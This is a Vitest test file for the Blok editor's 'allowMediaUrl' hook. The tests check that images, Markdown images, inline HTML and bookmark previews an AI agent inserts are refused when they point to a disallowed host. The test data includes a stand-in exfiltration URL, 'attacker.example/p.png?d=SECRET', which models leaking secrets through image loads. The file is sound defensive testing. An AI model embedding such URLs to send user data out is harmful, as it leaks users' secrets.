// @vitest-environment jsdom
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { Blok } from '../../../src/blok';
import { Bookmark, Image, Paragraph } from '../../../src/tools';
import type { Agent, BlokConfig, OutputData } from '../../../types';
import type { AgentCommand, AgentResult } from '../../../types/agent';

interface TestEditor {
  isReady: Promise<unknown>;
  destroy: () => void;
  agent: Agent;
  save: () => Promise<OutputData>;
}

const BAD = 'https://attacker.example/p.png?d=SECRET';
const GOOD = 'https://cdn.example/p.png';

const editors: TestEditor[] = [];
const holders = new Map<TestEditor, HTMLElement>();

const settle = (): Promise<void> => new Promise(resolve => {
  setTimeout(resolve, 0);
});

const boot = async (allowMediaUrl?: (url: string) => boolean): Promise<{ editor: TestEditor; holder: HTMLElement }> => {
  const holder = document.createElement('div');

  document.body.appendChild(holder);
  const config: BlokConfig = {
    holder,
    user: { id: 'human-1' },
    tools: { paragraph: Paragraph, image: Image, bookmark: Bookmark },
    data: { blocks: [{ id: 'p1', type: 'paragraph', data: { text: 'hello' } }] },
    agent: {
      assistant: {
        model: () => Promise.resolve({ content: [], stop_reason: 'end_turn' }),
        ...(allowMediaUrl !== undefined && { allowMediaUrl }),
      },
    },
  };
  const editor = new Blok(config) as unknown as TestEditor;

  editors.push(editor);
  holders.set(editor, holder);
  await editor.isReady;
  await settle();

  return { editor, holder };
};

const run = async (editor: TestEditor, command: AgentCommand): Promise<AgentResult> => {
  const turn = editor.agent.begin({ agent: { id: 'bot', name: 'Bot' } });
  const result = await turn.execute({ commands: [command] });

  turn.end();
  await settle();
  await settle();

  return result;
};

/** Every src-like attribute in the editor that names `url`. */
const loads = (holder: HTMLElement, url: string): string[] => [...holder.querySelectorAll('*')].flatMap(element =>
  [...element.attributes].filter(attr => /src|href|poster/i.test(attr.name) && attr.value.includes(url)).map(attr => `${element.tagName}[${attr.name}]`));

const onlyCdn = (url: string): boolean => new URL(url).host === 'cdn.example';

beforeEach(() => {
  vi.clearAllMocks();
});

afterEach(() => {
  editors.splice(0).forEach(editor => {
    editor.destroy();
    holders.get(editor)?.remove();
  });
  vi.restoreAllMocks();
});

describe('agent.assistant.allowMediaUrl', () => {
  it('refuses an agent image on a host the hook refuses, so the editor never loads it', async () => {
    const { editor, holder } = await boot(onlyCdn);
    const result = await run(editor, { name: 'block.insert', args: { type: 'image', data: { url: BAD } } });

    expect(loads(holder, 'attacker.example')).toEqual([]);
    expect(result).toMatchObject({ ok: false, error: { code: 'DATA_REJECTED', details: { reason: 'media-url', url: BAD } } });
    expect((await editor.save()).blocks.map(block => block.type)).toEqual(['paragraph']);
  });

  it('keeps an agent image on a host the hook allows', async () => {
    const { editor, holder } = await boot(onlyCdn);
    const result = await run(editor, { name: 'block.insert', args: { type: 'image', data: { url: GOOD } } });

    expect(result.ok).toBe(true);
    expect(holder.querySelector(`img[src="${GOOD}"]`)).not.toBeNull();
  });

  it('refuses a Markdown image inside a sentence, which becomes inline HTML', async () => {
    const { editor, holder } = await boot(onlyCdn);
    const result = await run(editor, { name: 'markdown.insert', args: { markdown: `see ![e](${BAD}) here` } });

    expect(loads(holder, 'attacker.example')).toEqual([]);
    expect(result).toMatchObject({ ok: false, error: { code: 'DATA_REJECTED', details: { reason: 'media-url' } } });
  });

  it('refuses a lone Markdown image', async () => {
    const { editor, holder } = await boot(onlyCdn);
    const result = await run(editor, { name: 'markdown.insert', args: { markdown: `![e](${BAD})` } });

    expect(loads(holder, 'attacker.example')).toEqual([]);
    expect(result).toMatchObject({ ok: false, error: { code: 'DATA_REJECTED', details: { reason: 'media-url' } } });
  });

  it('refuses an image in an inline HTML segment', async () => {
    const { editor, holder } = await boot(onlyCdn);
    const result = await run(editor, { name: 'block.insert', args: {
      type: 'paragraph', data: { text: [{ text: 'x ' }, { embed: { html: `<img src="${BAD}">` } }] },
    } });

    expect(loads(holder, 'attacker.example')).toEqual([]);
    expect(result).toMatchObject({ ok: false, error: { code: 'DATA_REJECTED', details: { reason: 'media-url', url: BAD } } });
  });

  it('refuses a bookmark preview image', async () => {
    const { editor, holder } = await boot(onlyCdn);
    const result = await run(editor, { name: 'block.insert', args: { type: 'bookmark', data: { url: 'https://site.example/', image: BAD } } });

    expect(loads(holder, 'attacker.example')).toEqual([]);
    expect(result).toMatchObject({ ok: false, error: { code: 'DATA_REJECTED', details: { reason: 'media-url' } } });
  });

  it('asks the hook about a relative URL as the absolute URL the browser would load', async () => {
    const hook = vi.fn(() => false);
    const { editor } = await boot(hook);

    await run(editor, { name: 'block.insert', args: { type: 'image', data: { url: '//attacker.example/p.png' } } });

    expect(hook).toHaveBeenCalledWith(new URL('//attacker.example/p.png', document.baseURI).href);
  });

  it('never asks about a data: image, which loads nothing from the network', async () => {
    const hook = vi.fn(() => false);
    const { editor } = await boot(hook);
    const result = await run(editor, { name: 'block.insert', args: { type: 'image', data: { url: 'data:image/png;base64,iVBORw0KGgo=' } } });

    expect(hook).not.toHaveBeenCalled();
    expect(result.ok).toBe(true);
  });

  it('treats a hook that throws as a refusal', async () => {
    const { editor, holder } = await boot(() => {
      throw new Error('boom');
    });
    const result = await run(editor, { name: 'block.insert', args: { type: 'image', data: { url: BAD } } });

    expect(loads(holder, 'attacker.example')).toEqual([]);
    expect(result).toMatchObject({ ok: false, error: { code: 'DATA_REJECTED', details: { reason: 'media-url' } } });
  });

  it('loads any agent image when the host sets no hook', async () => {
    const { editor, holder } = await boot();
    const result = await run(editor, { name: 'block.insert', args: { type: 'image', data: { url: BAD } } });

    expect(result.ok).toBe(true);
    expect(holder.querySelector(`img[src="${BAD}"]`)).not.toBeNull();
  });
});
